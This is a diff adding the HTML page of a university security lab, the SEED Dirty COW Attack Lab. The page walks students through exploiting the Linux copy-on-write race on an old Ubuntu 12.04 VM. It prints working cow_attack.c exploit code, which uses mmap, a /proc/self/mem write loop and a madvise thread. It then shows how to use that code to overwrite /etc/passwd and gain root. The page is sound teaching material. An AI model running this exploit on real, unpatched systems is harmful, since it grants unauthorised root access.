@@ -1,0 +1,482 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <title>Dirty COW Attack Lab &mdash; Network Security Lab  documentation</title>
+  
+
+  
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+
+  
+  
+
+  
+  
+
+  
+
+  
+  <!--[if lt IE 9]>
+    <script src="../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+        <script src="../../_static/jquery.js"></script>
+        <script src="../../_static/underscore.js"></script>
+        <script src="../../_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="../../_static/js/theme.js"></script>
+
+    
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Format String Attack Lab" href="Format_String.html" />
+    <link rel="prev" title="Race Condition Vulnerability Lab" href="Race_Condition.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../../index.html" class="icon icon-home"> Network Security Lab
+          
+
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../xie/xie_labs.html">Xie Labs</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../seed_index.html">SEED Labs</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../crypto/crypto_index.html">Cryptography Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../hardware/hardware_index.html">Hardware Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../mobile/mobile_index.html">Mobile Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../network/network_index.html">Network Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../web/web_index.html">Web Security Labs</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="software_index.html">Software Security Labs</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="Shellcode.html">Shellcode Development Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Buffer_Overflow_Setuid.html">Buffer Overflow Attack Lab (Set-UID Version)</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Buffer_Overflow_Server.html">Buffer Overflow Attack Lab (Server Version)</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Return_to_Libc.html">Return-to-libc Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Environment_Variable_and_SetUID.html">Environment Variable and Program Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Race_Condition.html">Race Condition Vulnerability Lab</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">Dirty COW Attack Lab</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#overview">Overview</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-1-modify-a-dummy-read-only-file">Task 1: Modify a Dummy Read-Only File</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-2-modify-the-password-file-to-gain-the-root-privilege">Task 2: Modify the Password File to Gain the Root Privilege</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#submission">Submission</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="Format_String.html">Format String Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Shellshock.html">Shellshock Attack Lab</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../website_link/web_index.html"><strong>Return To Website</strong></a></li>
+</ul>
+
+            
+          
+        </div>
+        
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Network Security Lab</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
+        
+          <li><a href="../seed_index.html">SEED Labs</a> &raquo;</li>
+        
+          <li><a href="software_index.html">Software Security Labs</a> &raquo;</li>
+        
+      <li>Dirty COW Attack Lab</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="dirty-cow-attack-lab">
+<h1>Dirty COW Attack Lab<a class="headerlink" href="#dirty-cow-attack-lab" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="overview">
+<h2>Overview<a class="headerlink" href="#overview" title="Permalink to this headline">¶</a></h2>
+<p>The Dirty COW vulnerability is an interesting case of the race condition
+vulnerability. It existed in the kernel since September 2007, and was
+discovered and exploited in October 2016. The vulnerability affects all
+-based operating systems, including Android, and its consequence is very
+severe: attackers can gain the root privilege by exploiting the
+vulnerability. The vulnerability resides in the code of copy-on-write
+inside kernel. By exploiting this vulnerability, attackers can modify
+any protected file, even though these files are only readable to them.</p>
+<p>The objective of this lab is for students to gain the hands-on
+experience on the Dirty COW attack, understand the race condition
+vulnerability exploited by the attack, and gain a deeper understanding
+of the general race condition security problems. In this lab, students
+will exploit the Dirty COW race condition vulnerability to gain the root
+privilege.</p>
+<p><strong>Readings and videos.</strong> Detailed coverage of the Dirty COW attack can be found in the following:</p>
+<ul class="simple">
+<li><p>Chapter 8 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition, by
+Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</p></li>
+<li><p>Section 7 of the SEED Lecture at Udemy, Computer Security: A Hands-on Approach, by Wenliang
+Du. See details at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</p></li>
+</ul>
+<p><strong>Lab environment.</strong> This lab has been tested on our pre-built Ubuntu 12.04 VM, which can be
+downloaded from the SEED website. If you are using our SEEDUbuntu 16.04
+VM, this attack will not work, because the vulnerability has already
+been patched in the kernel. You can download the SEEDUbuntu12.04 VM from
+the SEED web site. If you have an Amazon EC2 account, you can find our
+VM from the “Community AMIs”. The name of the VM is
+<code class="docutils literal notranslate"><span class="pre">SEEDUbuntu12.04-Generic</span></code>. It should be noted that Amazon’s site says
+that this is a 64-bit VM; that is incorrect. The VM is 32-bit. However,
+this incorrect information does not cause any problem.</p>
+</div>
+<div class="section" id="task-1-modify-a-dummy-read-only-file">
+<h2>Task 1: Modify a Dummy Read-Only File<a class="headerlink" href="#task-1-modify-a-dummy-read-only-file" title="Permalink to this headline">¶</a></h2>
+<p>The objective of this task is to write to a read-only file using the
+Dirty COW vulnerability.</p>
+<div class="section" id="create-a-dummy-file">
+<h3>Create a Dummy File<a class="headerlink" href="#create-a-dummy-file" title="Permalink to this headline">¶</a></h3>
+<p>We first need to select a target file. Although this file can be any
+read-only file in the system, we will use a dummy file in this task, so
+we do not corrupt an important system file in case we make a mistake.
+Please create a file called <code class="docutils literal notranslate"><span class="pre">zzz</span></code> in the root directory, change its
+permission to read-only for normal users, and put some random content
+into the file using an editor such as <code class="docutils literal notranslate"><span class="pre">gedit</span></code>.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ sudo touch /zzz
+$ sudo chmod 644 /zzz
+$ sudo gedit /zzz
+$ cat /zzz
+111111222222333333
+$ ls -l /zzz
+-rw-r--r-- 1 root root 19 Oct 18 22:03 /zzz
+$ echo 99999 &gt; /zzz
+bash: /zzz: (*@\texttt{Permission denied}@*)
+</pre></div>
+</div>
+<p>From the above experiment, we can see that if we try to write to this
+file as a normal user, we will fail, because the file is only readable
+to normal users. However, because of the Dirty COW vulnerability in the
+system, we can find a way to write to this file. Our objective is to
+replace the pattern <code class="docutils literal notranslate"><span class="pre">&quot;222222&quot;</span></code> with <code class="docutils literal notranslate"><span class="pre">&quot;******&quot;</span></code>.</p>
+</div>
+<div class="section" id="set-up-the-memory-mapping-thread">
+<h3>Set Up the Memory Mapping Thread<a class="headerlink" href="#set-up-the-memory-mapping-thread" title="Permalink to this headline">¶</a></h3>
+<p>You can download the program <code class="docutils literal notranslate"><span class="pre">cow_attack.c</span></code> from the website of the
+lab. The program has three threads: the main thread, the write thread,
+and the madvise thread. The main thread maps <code class="docutils literal notranslate"><span class="pre">/zzz</span></code> to memory, finds
+where the pattern <code class="docutils literal notranslate"><span class="pre">&quot;222222&quot;</span></code> is, and then creates two threads to
+exploit the Dirty COW race condition vulnerability in the OS kernel.
+Listing 1: The main thread.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>/* cow_attack.c  (the main thread) */
+
+#include &lt;sys/mman.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;string.h&gt;
+
+void *map;
+
+int main(int argc, char *argv[])
+{
+  pthread_t pth1,pth2;
+  struct stat st;
+  int file_size;
+
+  // Open the target file in the read-only mode.
+  int f=open(&quot;/zzz&quot;, O_RDONLY);
+
+  // Map the file to COW memory using MAP_PRIVATE.
+  fstat(f, &amp;st);
+  file_size = st.st_size;
+  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
+
+  // Find the position of the target area
+  char *position = strstr(map, &quot;222222&quot;);                         ➀
+
+  // We have to do the attack using two threads.
+  pthread_create(&amp;pth1, NULL, madviseThread, (void  *)file_size); ➁
+  pthread_create(&amp;pth2, NULL, writeThread, position);             (3)
+
+  // Wait for the threads to finish.
+  pthread_join(pth1, NULL);
+  pthread_join(pth2, NULL);
+  return 0;
+}
+</pre></div>
+</div>
+<p>In the above code, we need to find where the pattern <code class="docutils literal notranslate"><span class="pre">&quot;222222&quot;</span></code>is.
+We use a string function called <code class="docutils literal notranslate"><span class="pre">strstr()</span></code> to find where <code class="docutils literal notranslate"><span class="pre">&quot;222222&quot;</span></code>
+is in the mapped memory (Line ➀). We then start two threads:
+<code class="docutils literal notranslate"><span class="pre">madviseThread</span></code> (Line ➁) and <code class="docutils literal notranslate"><span class="pre">writeThread</span></code> (Line ➂).</p>
+</div>
+<div class="section" id="set-up-the-write-thread">
+<h3>Set Up the <code class="docutils literal notranslate"><span class="pre">write</span></code> Thread<a class="headerlink" href="#set-up-the-write-thread" title="Permalink to this headline">¶</a></h3>
+<p>The job of the <code class="docutils literal notranslate"><span class="pre">write</span></code> thread listed in the following is to replace
+the string <code class="docutils literal notranslate"><span class="pre">&quot;222222&quot;</span></code> in the memory with <code class="docutils literal notranslate"><span class="pre">&quot;******&quot;</span></code>. Since the
+mapped memory is of COW type, this thread alone will only be able to
+modify the contents in a copy of the mapped memory, which will not cause
+any change to the underlying <code class="docutils literal notranslate"><span class="pre">/zzz</span></code> file. Below is Listing 2: The
+<code class="docutils literal notranslate"><span class="pre">write</span></code> thread.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>/* cow_attack.c (the write thread) */
+
+void *writeThread(void *arg)
+{
+  char *content= &quot;******&quot;;
+  off_t offset = (off_t) arg;
+
+  int f=open(&quot;/proc/self/mem&quot;, O_RDWR);
+  while(1) {
+    // Move the file pointer to the corresponding position.
+    lseek(f, offset, SEEK_SET);
+    // Write to the memory.
+    write(f, content, strlen(content));
+  }
+}
+</pre></div>
+</div>
+</div>
+<div class="section" id="the-madvise-thread">
+<h3>The <code class="docutils literal notranslate"><span class="pre">madvise</span></code> Thread<a class="headerlink" href="#the-madvise-thread" title="Permalink to this headline">¶</a></h3>
+<p>The <code class="docutils literal notranslate"><span class="pre">madvise</span></code> thread does only one thing: discarding the private copy
+of the mapped memory, so the page table can point back to the original
+mapped memory. Below is Listing 3: The <code class="docutils literal notranslate"><span class="pre">madvise</span></code> thread.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>/* cow_attack.c (the madvise thread) */
+
+void *madviseThread(void *arg)
+{
+  int file_size = (int) arg;
+  while(1){
+      madvise(map, file_size, MADV_DONTNEED);
+  }
+}
+</pre></div>
+</div>
+</div>
+<div class="section" id="launch-the-attack">
+<h3>Launch the Attack<a class="headerlink" href="#launch-the-attack" title="Permalink to this headline">¶</a></h3>
+<p>If the <code class="docutils literal notranslate"><span class="pre">write()</span></code> and the <code class="docutils literal notranslate"><span class="pre">madvise()</span></code> system calls are invoked
+alternatively, i.e., one is invoked only after the other is finished,
+the <code class="docutils literal notranslate"><span class="pre">write</span></code> operation will always be performed on the private copy,
+and we will never be able to modify the target file. The only way for
+the attack to succeed is to perform the <code class="docutils literal notranslate"><span class="pre">madvise()</span></code> system call while
+the <code class="docutils literal notranslate"><span class="pre">write()</span></code> system call is still running. We cannot always achieve
+that, so we need to try many times. As long as the probability is not
+extremely low, we have a chance. That is why in the threads, we run the
+two system calls in an infinite loop. Compile the <code class="docutils literal notranslate"><span class="pre">cow_attack.c</span></code> and
+run it for a few seconds. If your attack is successful, you should be
+able to see a modified <code class="docutils literal notranslate"><span class="pre">/zzz</span></code> file. Report your results in the lab
+report and explain how you are able to achieve that.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ gcc cow_attack.c -lpthread
+$ a.out
+  ... press Ctrl-C after a few seconds ...
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="task-2-modify-the-password-file-to-gain-the-root-privilege">
+<h2>Task 2: Modify the Password File to Gain the Root Privilege<a class="headerlink" href="#task-2-modify-the-password-file-to-gain-the-root-privilege" title="Permalink to this headline">¶</a></h2>
+<p>Now, let’s launch the attack on a real system file, so we can gain the
+root privilege. We choose the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file as our target file.
+This file is world-readable, but non-root users cannot modify it. The
+file contains the user account information, one record for each user.
+Assume that our user name is <code class="docutils literal notranslate"><span class="pre">seed</span></code> . The following lines show the
+records for root and <code class="docutils literal notranslate"><span class="pre">seed</span></code>:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>root:x:0:0:root:/root:/bin/bash
+seed:x:1000:1000:Seed,123,,:/home/seed:/bin/bash
+</pre></div>
+</div>
+<p>Each of the above record contains seven colon-separated fields. Our
+interest is on the third field, which specifies the user ID (UID) value
+assigned to a user. UID is the primary basis for access control in , so
+this value is critical to security. The root user’s UID field contains a
+special value 0; that is what makes it the superuser, not its name. Any
+user with UID <code class="docutils literal notranslate"><span class="pre">0</span></code> is treated by the system as root, regardless of what
+user name he or she has. The <code class="docutils literal notranslate"><span class="pre">seed</span></code> user’s ID is only <code class="docutils literal notranslate"><span class="pre">1000</span></code>, so it
+does not have the root privilege. However, if we can change the value to
+<code class="docutils literal notranslate"><span class="pre">0</span></code>, we can turn it into root. We will exploit the Dirty COW
+vulnerability to achieve this goal.</p>
+<p>In our experiment, we will not use the <code class="docutils literal notranslate"><span class="pre">seed</span></code> account, because this
+account is used for most of the experiments in this book; if we forget
+to change the UID back after the experiment, other experiments will be
+affected. Instead, we create a new account called <code class="docutils literal notranslate"><span class="pre">charlie</span></code>, and we
+will turn this normal user into root using the Dirty COW attack. Adding
+a new account can be achieved using the <code class="docutils literal notranslate"><span class="pre">adduser</span></code> command. After the
+account is created, a new record will be added to <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code>. See
+the following:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ sudo adduser charlie
+  ...
+$ cat /etc/passwd | grep charlie
+charlie:x:1001:1001:,,,:/home/charlie:/bin/bash
+</pre></div>
+</div>
+<p>We suggest that you save a copy of the <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file, just in
+case you make a mistake and corrupt this file. An alternative is to take
+a snapshot of your VM before working on this lab, so you can always roll
+back if the VM got corrupted.</p>
+<p><strong>Task.</strong> You need to modify the <code class="docutils literal notranslate"><span class="pre">charlie</span></code>’s entry in <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code>, so the
+third field is changed from <code class="docutils literal notranslate"><span class="pre">1001</span></code> to <code class="docutils literal notranslate"><span class="pre">0000</span></code>, essentially turning
+<code class="docutils literal notranslate"><span class="pre">charlie</span></code> into a root account. The file is not writable to
+<code class="docutils literal notranslate"><span class="pre">charlie</span></code>, but we can use the Dirty COW attack to write to this file.
+You can modify the <code class="docutils literal notranslate"><span class="pre">cow_attack.c</span></code> program from Task 1 to achieve this
+goal.</p>
+<p>After your attack is successful, if you switch user to <code class="docutils literal notranslate"><span class="pre">charlie</span></code>, you
+should be able to see the <code class="docutils literal notranslate"><span class="pre">#</span></code> sign at the shell prompt, which is an
+indicator of the root shell. If you run the <code class="docutils literal notranslate"><span class="pre">id</span></code> command, you should
+be able to see that you have gained the root privilege.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>seed@ubuntu$ su charlie
+Passwd:
+root@ubuntu# id
+uid=0(root) gid=1001(charlie) groups=0(root),1001(charlie)
+</pre></div>
+</div>
+</div>
+<div class="section" id="submission">
+<h2>Submission<a class="headerlink" href="#submission" title="Permalink to this headline">¶</a></h2>
+<p>You need to submit a detailed lab report, with screenshots, to describe what you have done and what you
+have observed. You also need to provide explanation to the observations that are interesting or surprising.
+Please also list the important code snippets followed by explanation. Simply attaching code without any
+explanation will not receive credits</p>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+        <a href="Format_String.html" class="btn btn-neutral float-right" title="Format String Attack Lab" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+        <a href="Race_Condition.html" class="btn btn-neutral float-left" title="Race Condition Vulnerability Lab" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &#169; Copyright 2021, NEXUS Lab.
+
+    </p>
+  </div>
+    
+    
+    
+    Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    
+    provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
